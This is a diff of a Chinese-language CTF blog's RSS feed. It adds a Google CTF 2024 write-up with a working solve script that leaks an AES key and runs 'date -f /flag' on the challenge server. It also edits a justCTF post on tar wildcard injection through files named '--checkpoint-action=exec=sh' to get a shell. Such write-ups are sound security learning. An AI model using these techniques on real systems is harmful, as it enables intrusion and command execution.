@@ -7,14 +7,162 @@
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
     <copyright>wind1900</copyright>
-    <lastBuildDate>Sun, 16 Jun 2024 00:00:00 +0000</lastBuildDate>
+    <lastBuildDate>Mon, 24 Jun 2024 00:00:00 +0000</lastBuildDate>
     <atom:link href="https://wind1900.github.io/ctf/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Google CTF 2024</title>
+      <link>https://wind1900.github.io/ctf/google_ctf_2024/</link>
+      <pubDate>Mon, 24 Jun 2024 00:00:00 +0000</pubDate>
+      <guid>https://wind1900.github.io/ctf/google_ctf_2024/</guid>
+      <description>简介 简单题题目都能看懂，就是都没做出来，最后还是队友做出来一道&#xA;pwn-encrypted-runner 题目下载：https://storage.googleapis.com/2024-attachments/b557dbb14eb7e9324cf9b76e1d4f8ecbdad9d1e56e0c1dc525a98f6e365e83b418f969421d7fd82bc71788bf41ea02e8cabe62f6820720b0edd9a4de3e49bf74.zip&#xA;Welcome to encrypted command runner. What do you want to do? - encrypt command (e.g. &amp;#39;encrypt echo test&amp;#39;) - run command (e.g. &amp;#39;run fefed6ce5359d0e886090575b2f1e0c7&amp;#39;) - exit 运行后提供了两个选项，加密命令和运行命令。加密命令会将后面的命令转化为16个字节，长度不够则用0补齐，传给自己写的一个aes程序做加密。运行命令则是接收一串十六进制字符，长度也是最多16个byte，用aes解密后得到真实命令再运行。本地运行aes时需要创建一个长度16字节的key文件，但因为拿不到服务器的key文件，所以加密后的数据也不同&#xA;从python代码里可以得知，允许的命令只有三个， date echo ls 。 date 不允许后面有参数， echo 后面可以跟 [\w. ]+ ， ls 后面可以跟 [/\w]+ 在加密命令的时候，会检查命令和参数是否合规，但在运行命令的时候，只会检查命令而不检查参数。因此想到如果可以让它运行 date -f /flag ，就可以拿到flag了。但现在的问题就是无法得知服务器端aes加密用的key是什么，无法构建出来加密后的命令&#xA;看了解答后，知道漏洞出在什么地方了，aes是用c写的程序，理论上传入aes的是16个byte，输出也是16个byte，但这里的aes实现，输入的是16个uint32，就是可以传入大于0xff的数，然后通过解密得到的数值与&amp;#39;R&amp;#39;异或就能泄露出key的值，这是什么原理就不知道了！写了个程序测试一下&#xA;from pwn import * from random import randbytes, randint key = randbytes(16) print(&amp;#39;key: &amp;#39;, end=&amp;#39;&amp;#39;) for i in key: print(hex(i), end=&amp;#39; &amp;#39;) print() with open(&amp;#39;key&amp;#39;, &amp;#39;wb&amp;#39;) as f: f.</description>
+      <content:encoded><![CDATA[
+<div id="outline-container-headline-1" class="outline-2">
+<h2 id="headline-1">
+简介
+</h2>
+<div id="outline-text-headline-1" class="outline-text-2">
+<p>简单题题目都能看懂，就是都没做出来，最后还是队友做出来一道</p>
+</div>
+</div>
+<div id="outline-container-headline-2" class="outline-2">
+<h2 id="headline-2">
+pwn-encrypted-runner
+</h2>
+<div id="outline-text-headline-2" class="outline-text-2">
+<p>题目下载：<a href="https://storage.googleapis.com/2024-attachments/b557dbb14eb7e9324cf9b76e1d4f8ecbdad9d1e56e0c1dc525a98f6e365e83b418f969421d7fd82bc71788bf41ea02e8cabe62f6820720b0edd9a4de3e49bf74.zip">https://storage.googleapis.com/2024-attachments/b557dbb14eb7e9324cf9b76e1d4f8ecbdad9d1e56e0c1dc525a98f6e365e83b418f969421d7fd82bc71788bf41ea02e8cabe62f6820720b0edd9a4de3e49bf74.zip</a></p>
+<div class="src src-text">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Welcome to encrypted command runner.
+</span></span><span style="display:flex;"><span>What do you want to do?
+</span></span><span style="display:flex;"><span>- encrypt command (e.g. &#39;encrypt echo test&#39;)
+</span></span><span style="display:flex;"><span>- run command (e.g. &#39;run fefed6ce5359d0e886090575b2f1e0c7&#39;)
+</span></span><span style="display:flex;"><span>- exit</span></span></code></pre></div>
+</div>
+<p>运行后提供了两个选项，加密命令和运行命令。加密命令会将后面的命令转化为16个字节，长度不够则用0补齐，传给自己写的一个aes程序做加密。运行命令则是接收一串十六进制字符，长度也是最多16个byte，用aes解密后得到真实命令再运行。本地运行aes时需要创建一个长度16字节的key文件，但因为拿不到服务器的key文件，所以加密后的数据也不同<br>
+从python代码里可以得知，允许的命令只有三个， <code>date</code> <code>echo</code> <code>ls</code> 。 <code>date</code> 不允许后面有参数， <code>echo</code> 后面可以跟 <code>[\w. ]+</code> ， <code>ls</code> 后面可以跟 <code>[/\w]+</code> <br>
+在加密命令的时候，会检查命令和参数是否合规，但在运行命令的时候，只会检查命令而不检查参数。因此想到如果可以让它运行 <code>date -f /flag</code> ，就可以拿到flag了。但现在的问题就是无法得知服务器端aes加密用的key是什么，无法构建出来加密后的命令<br>
+看了解答后，知道漏洞出在什么地方了，aes是用c写的程序，理论上传入aes的是16个byte，输出也是16个byte，但这里的aes实现，输入的是16个uint32，就是可以传入大于0xff的数，然后通过解密得到的数值与&#39;R&#39;异或就能泄露出key的值，这是什么原理就不知道了！写了个程序测试一下</p>
+<div class="src src-python">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>  <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">from</span> random <span style="color:#f92672">import</span> randbytes, randint
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  key <span style="color:#f92672">=</span> randbytes(<span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>  print(<span style="color:#e6db74">&#39;key: &#39;</span>, end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> key:
+</span></span><span style="display:flex;"><span>      print(hex(i), end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39; &#39;</span>)
+</span></span><span style="display:flex;"><span>  print()
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;key&#39;</span>, <span style="color:#e6db74">&#39;wb&#39;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>      f<span style="color:#f92672">.</span>write(key)
+</span></span><span style="display:flex;"><span>  p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;aes&#34;</span>, level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;error&#39;</span>)
+</span></span><span style="display:flex;"><span>  payload <span style="color:#f92672">=</span> [randint(<span style="color:#ae81ff">0x100</span>, <span style="color:#ae81ff">0x1000</span>) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">16</span>)]
+</span></span><span style="display:flex;"><span>  i <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;encrypt &#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; &#39;</span><span style="color:#f92672">.</span>join(hex(i)[<span style="color:#ae81ff">2</span>:] <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> payload)
+</span></span><span style="display:flex;"><span>  print(i)
+</span></span><span style="display:flex;"><span>  p<span style="color:#f92672">.</span>sendline(i<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>  o <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>  print(o<span style="color:#f92672">.</span>decode())
+</span></span><span style="display:flex;"><span>  p<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>  p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;aes&#34;</span>, level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;error&#39;</span>)
+</span></span><span style="display:flex;"><span>  i <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;decrypt &#39;</span> <span style="color:#f92672">+</span> o
+</span></span><span style="display:flex;"><span>  print(i<span style="color:#f92672">.</span>decode())
+</span></span><span style="display:flex;"><span>  p<span style="color:#f92672">.</span>sendline(i)
+</span></span><span style="display:flex;"><span>  o <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>  print(o<span style="color:#f92672">.</span>decode())
+</span></span><span style="display:flex;"><span>  p<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>  s <span style="color:#f92672">=</span> o<span style="color:#f92672">.</span>decode()<span style="color:#f92672">.</span>split()
+</span></span><span style="display:flex;"><span>  print(<span style="color:#e6db74">&#39;the xor value of key and each decrypt value:&#39;</span>)
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">16</span>):
+</span></span><span style="display:flex;"><span>      h <span style="color:#f92672">=</span> int(s[i], <span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>      print(hex(h <span style="color:#f92672">^</span> key[i]), chr(h <span style="color:#f92672">^</span> key[i]), end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;, &#39;</span>)
+</span></span><span style="display:flex;"><span>      print()</span></span></code></pre></div>
+</div>
+<p>输出如下</p>
+<div class="src src-text">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>key: 0xf6 0x7b 0x4b 0xfc 0x27 0x22 0x31 0xc5 0x6b 0x17 0x62 0x80 0xb 0xcc 0xb2 0xe9
+</span></span><span style="display:flex;"><span>encrypt f8f 2fa 399 6aa 67d 33e 87c 919 fcf a82 b39 809 45c cb6 f24 183
+</span></span><span style="display:flex;"><span>30 af b8 33 3f 1b ac 61 58 70 8d f4 e7 7a 89 b7
+</span></span><span style="display:flex;"><span>decrypt 30 af b8 33 3f 1b ac 61 58 70 8d f4 e7 7a 89 b7
+</span></span><span style="display:flex;"><span>a4 29 19 ae 75 70 63 97 39 45 30 d2 59 9e e0 bb
+</span></span><span style="display:flex;"><span>the xor value of key and each decrypt value:
+</span></span><span style="display:flex;"><span>0x52 R, 0x52 R, 0x52 R, 0x52 R, 0x52 R, 0x52 R, 0x52 R, 0x52 R, 0x52 R, 0x52 R, 0x52 R, 0x52 R, 0x52 R, 0x52 R, 0x52 R, 0x52 R,</span></span></code></pre></div>
+</div>
+<p>可以看出对于随机的key和随机超过0xff的输入，解密后的数值与对应key的数值异或结果都是R，那么反过来也可以得到key的数值。对于本题来说，可以用ls命令跟着13个大于0xff的字符，经过加密解密后，与R异或后得到key，那么只有key前三位的值是不确定的，可以遍历搜索并用题中给出的echo test的例子进行验证<br>
+另外一个不理解的地方，在运行命令后得到，应该如何解码成需要的13个字节，看了解答需要 <code>bash -c &#34;echo -n &#39;&#39;$&#39;\017&#39;&#39;[&#39;$&#39;\034\203&#39;&#39;:Q&#39;$&#39;\031&#39;&#39;z&#39;$&#39;\a\035\252\370\373&#39;&#34;</code> 这样才行，直接 <code>echo -n</code> 不知道为什么得到的就不对，不知道为什么<br>
+解答如下，参考<a href="https://github.com/google/google-ctf/blob/main/2024/quals/pwn-encrypted-runner/challenge/solve.py">https://github.com/google/google-ctf/blob/main/2024/quals/pwn-encrypted-runner/challenge/solve.py</a></p>
+<div class="src src-python">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>  <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">from</span> Crypto.Cipher <span style="color:#f92672">import</span> AES
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;encrypted-runner.2024.ctfcompetition.com&#39;</span>, <span style="color:#e6db74">&#39;1337&#39;</span>)
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">#echo_test = &#39;fefed6ce5359d0e886090575b2f1e0c7&#39;</span>
+</span></span><span style="display:flex;"><span>  p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;- run command (e.g. &#39;run &#34;</span>)
+</span></span><span style="display:flex;"><span>  echo_test <span style="color:#f92672">=</span> bytes<span style="color:#f92672">.</span>fromhex(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#39;&#34;</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>decode())
+</span></span><span style="display:flex;"><span>  print(echo_test)
+</span></span><span style="display:flex;"><span>  c <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x106</span>
+</span></span><span style="display:flex;"><span>  p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;encrypt ls &#39;</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">13</span> <span style="color:#f92672">*</span> chr(c)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>  p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Encrypted command: &#39;</span>)
+</span></span><span style="display:flex;"><span>  encrypt_command <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvline()[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>  p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;run &#39;</span> <span style="color:#f92672">+</span> encrypt_command)
+</span></span><span style="display:flex;"><span>  p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;cannot access &#39;</span>)
+</span></span><span style="display:flex;"><span>  decrypt_value <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;: No such file or directory&#39;</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">27</span>]
+</span></span><span style="display:flex;"><span>  p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;exit&#39;</span>)
+</span></span><span style="display:flex;"><span>  p<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  p <span style="color:#f92672">=</span> process([<span style="color:#e6db74">&#39;bash&#39;</span>, <span style="color:#e6db74">&#39;-c&#39;</span>, <span style="color:#e6db74">&#39;echo -n &#39;</span> <span style="color:#f92672">+</span> decrypt_value<span style="color:#f92672">.</span>decode()])
+</span></span><span style="display:flex;"><span>  decrypt_value <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvall()
+</span></span><span style="display:flex;"><span>  print(decrypt_value)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  key <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>] <span style="color:#f92672">+</span> [ord(<span style="color:#e6db74">&#39;R&#39;</span>) <span style="color:#f92672">^</span> i <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> decrypt_value]
+</span></span><span style="display:flex;"><span>  text <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;echo test&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">7</span>
+</span></span><span style="display:flex;"><span>  find <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> a <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">78</span>, <span style="color:#ae81ff">256</span>):
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> find:
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>      key[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> a
+</span></span><span style="display:flex;"><span>      print(a)
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">for</span> b <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0xa3</span>, <span style="color:#ae81ff">256</span>):
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> find:
+</span></span><span style="display:flex;"><span>              <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>          key[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> b
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0x93</span>, <span style="color:#ae81ff">256</span>):
+</span></span><span style="display:flex;"><span>              <span style="color:#66d9ef">if</span> find:
+</span></span><span style="display:flex;"><span>                  <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>              key[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> c
+</span></span><span style="display:flex;"><span>              cipher <span style="color:#f92672">=</span> AES<span style="color:#f92672">.</span>new(key<span style="color:#f92672">=</span>bytes(key), mode<span style="color:#f92672">=</span>AES<span style="color:#f92672">.</span>MODE_ECB)
+</span></span><span style="display:flex;"><span>              ciphertext <span style="color:#f92672">=</span> cipher<span style="color:#f92672">.</span>encrypt(text)
+</span></span><span style="display:flex;"><span>              <span style="color:#66d9ef">if</span> ciphertext <span style="color:#f92672">==</span> echo_test:
+</span></span><span style="display:flex;"><span>                  find <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  print(bytes(key))
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;key&#39;</span>, <span style="color:#e6db74">&#39;wb&#39;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>      f<span style="color:#f92672">.</span>write(bytes(key))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;date -f /flag</span><span style="color:#ae81ff">\x00\x00\x00</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>  cipher <span style="color:#f92672">=</span> AES<span style="color:#f92672">.</span>new(key<span style="color:#f92672">=</span>bytes(key), mode<span style="color:#f92672">=</span>AES<span style="color:#f92672">.</span>MODE_ECB)
+</span></span><span style="display:flex;"><span>  payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;run &#39;</span> <span style="color:#f92672">+</span> cipher<span style="color:#f92672">.</span>encrypt(cmd)<span style="color:#f92672">.</span>hex()<span style="color:#f92672">.</span>encode()
+</span></span><span style="display:flex;"><span>  p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;encrypted-runner.2024.ctfcompetition.com&#39;</span>, <span style="color:#e6db74">&#39;1337&#39;</span>)
+</span></span><span style="display:flex;"><span>  p<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>  p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;exit&#39;</span>)
+</span></span><span style="display:flex;"><span>  o <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvall()
+</span></span><span style="display:flex;"><span>  print(o<span style="color:#f92672">.</span>decode())</span></span></code></pre></div>
+</div>
+</div>
+</div>
+<div id="outline-container-headline-3" class="outline-2">
+<h2 id="headline-3">
+pwn-knife
+</h2>
+<div id="outline-text-headline-3" class="outline-text-2">
+<p>TODO</p>
+</div>
+</div>
+]]></content:encoded>
+    </item>
     <item>
       <title>第一次CTF比赛</title>
       <link>https://wind1900.github.io/ctf/%E7%AC%AC%E4%B8%80%E6%AC%A1ctf%E6%AF%94%E8%B5%9B/</link>
       <pubDate>Sun, 16 Jun 2024 00:00:00 +0000</pubDate>
       <guid>https://wind1900.github.io/ctf/%E7%AC%AC%E4%B8%80%E6%AC%A1ctf%E6%AF%94%E8%B5%9B/</guid>
-      <description>前言 算是第一次参加CTF比赛吧：https://2024.justctf.team/ 。找了一个队伍一起做，结果还不错，最终做出来一道简单的逆向题&#xA;分析 运行程序后会得到&#xA;JCTF COMMANDER v0.1 1. create file 2. rename file 3. print file 4. delete file 5. edit file 0. exit 虚拟了一个文件系统，根据选项可以创建，修改，打印，删除文件等。再把程序放进IDA中看一下 函数有很多，而且每个函数里嵌套层数也特别多，很多都是没用的函数。由于我不知道IDA中如何清理这些没用的函数，只好用gdb从头跑一遍看看都是干啥的，gdb里也没符号信息，不好下断点&#xA;第一个 sub_5840() 的作用是创建文件夹“fs”当作虚拟文件系统，后面的一系列方法是将不同选项对应的函数地址赋值到栈上的变量，格式很类似，从v5到v13。但是注意到程序只给了六个选项，而这里分配了9个，那么多出来的三个是什么呢？实验得知6和8都会报参数错误，7是一个archive选项，9或其它数字会导致段错误。再进一步观察选项7，它会调用 system(&amp;#34;tar cf &amp;#34;archive_name&amp;#34; *&amp;#34;) ！解题入口应该就在这里了&#xA;从网上搜索得知，如果可以创建文件 --checkpoint=1 和 --checkpoint-action=exec=sh ，那么tar命令的*就会展开成那两个特殊的文件名并当作tar的参数解析，作用就是可以执行shell。但是创建文件时发现它有一个文件名检查，只能包含字母数字或者 - . ，不能存在 = 或者 \ ，然后卡在这里快一天&#xA;后来尝试了创建链接，其它各种参数，不带 = 的写法，都没成功。就在比赛快结束的时候，我突然想到要不试试第2个重命名选项吧，结果重命名里没有检查文件名！接下来就简单了，新建文件，重命名文件，最后选择隐藏选项7，拿到shell。看来任一个函数都要仔细检查不能跳过&#xA;结论 再接再厉</description>
+      <description>前言 算是第一次参加CTF比赛吧：https://2024.justctf.team/ 。找了一个队伍一起做，结果还不错，最终做出来一道简单的逆向题&#xA;分析 运行程序后会得到&#xA;JCTF COMMANDER v0.1 1. create file 2. rename file 3. print file 4. delete file 5. edit file 0. exit 虚拟了一个文件系统，根据选项可以创建，修改，打印，删除文件等。再把程序放进IDA中看一下 函数有很多，而且每个函数里嵌套层数也特别多，很多都是没用的函数。由于我不知道IDA中如何清理这些没用的函数，只好用gdb从头跑一遍看看都是干啥的，gdb里也没符号信息，不好下断点&#xA;第一个 sub_5840() 的作用是创建文件夹“fs”当作虚拟文件系统，后面的一系列方法是将不同选项对应的函数地址赋值到栈上的变量，格式很类似，从v5到v13。但是注意到程序只给了六个选项，而这里分配了9个，那么多出来的三个是什么呢？试验得知6和8都会报参数错误，7是一个archive选项，9或其它数字会导致段错误。再进一步观察选项7，它会调用 system(&amp;#34;tar cf &amp;#34;archive_name&amp;#34; *&amp;#34;) ！解题入口应该就在这里了&#xA;从网上搜索得知，如果可以创建文件 --checkpoint=1 和 --checkpoint-action=exec=sh ，那么tar命令里的*就会展开成那两个特殊的文件名并当作tar的参数解析，作用就是可以执行shell。但是创建文件时发现它有一个文件名检查，只能包含字母数字或者 - . ，不能存在 = 或者 \ ，然后卡在这里快一天&#xA;后来尝试了创建链接，其它各种参数，不带 = 的写法，都没成功。就在比赛快结束的时候，我突然想到要不试试第2个重命名选项吧，结果重命名里没有检查文件名！接下来就简单了，新建文件，重命名文件，最后选择隐藏选项7，拿到shell。看来任一个函数都要仔细检查不能跳过&#xA;结论 再接再厉</description>
       <content:encoded><![CDATA[
 <div id="outline-container-headline-1" class="outline-2">
 <h2 id="headline-1">
@@ -44,8 +192,8 @@
 </figure>
 
 函数有很多，而且每个函数里嵌套层数也特别多，很多都是没用的函数。由于我不知道IDA中如何清理这些没用的函数，只好用gdb从头跑一遍看看都是干啥的，gdb里也没符号信息，不好下断点<br>
-第一个 <code>sub_5840()</code> 的作用是创建文件夹“fs”当作虚拟文件系统，后面的一系列方法是将不同选项对应的函数地址赋值到栈上的变量，格式很类似，从v5到v13。但是注意到程序只给了六个选项，而这里分配了9个，那么多出来的三个是什么呢？实验得知6和8都会报参数错误，7是一个archive选项，9或其它数字会导致段错误。再进一步观察选项7，它会调用 <code>system(&#34;tar cf &#34;archive_name&#34; *&#34;)</code> ！解题入口应该就在这里了<br>
-从网上搜索得知，如果可以创建文件 <code>--checkpoint=1</code> 和 <code>--checkpoint-action=exec=sh</code> ，那么tar命令的*就会展开成那两个特殊的文件名并当作tar的参数解析，作用就是可以执行shell。但是创建文件时发现它有一个文件名检查，只能包含字母数字或者 <code>- .</code> ，不能存在 <code>=</code> 或者 <code>\</code> ，然后卡在这里快一天<br>
+第一个 <code>sub_5840()</code> 的作用是创建文件夹“fs”当作虚拟文件系统，后面的一系列方法是将不同选项对应的函数地址赋值到栈上的变量，格式很类似，从v5到v13。但是注意到程序只给了六个选项，而这里分配了9个，那么多出来的三个是什么呢？试验得知6和8都会报参数错误，7是一个archive选项，9或其它数字会导致段错误。再进一步观察选项7，它会调用 <code>system(&#34;tar cf &#34;archive_name&#34; *&#34;)</code> ！解题入口应该就在这里了<br>
+从网上搜索得知，如果可以创建文件 <code>--checkpoint=1</code> 和 <code>--checkpoint-action=exec=sh</code> ，那么tar命令里的*就会展开成那两个特殊的文件名并当作tar的参数解析，作用就是可以执行shell。但是创建文件时发现它有一个文件名检查，只能包含字母数字或者 <code>- .</code> ，不能存在 <code>=</code> 或者 <code>\</code> ，然后卡在这里快一天<br>
 后来尝试了创建链接，其它各种参数，不带 <code>=</code> 的写法，都没成功。就在比赛快结束的时候，我突然想到要不试试第2个重命名选项吧，结果重命名里没有检查文件名！接下来就简单了，新建文件，重命名文件，最后选择隐藏选项7，拿到shell。看来任一个函数都要仔细检查不能跳过</p>
 </div>
 </div>
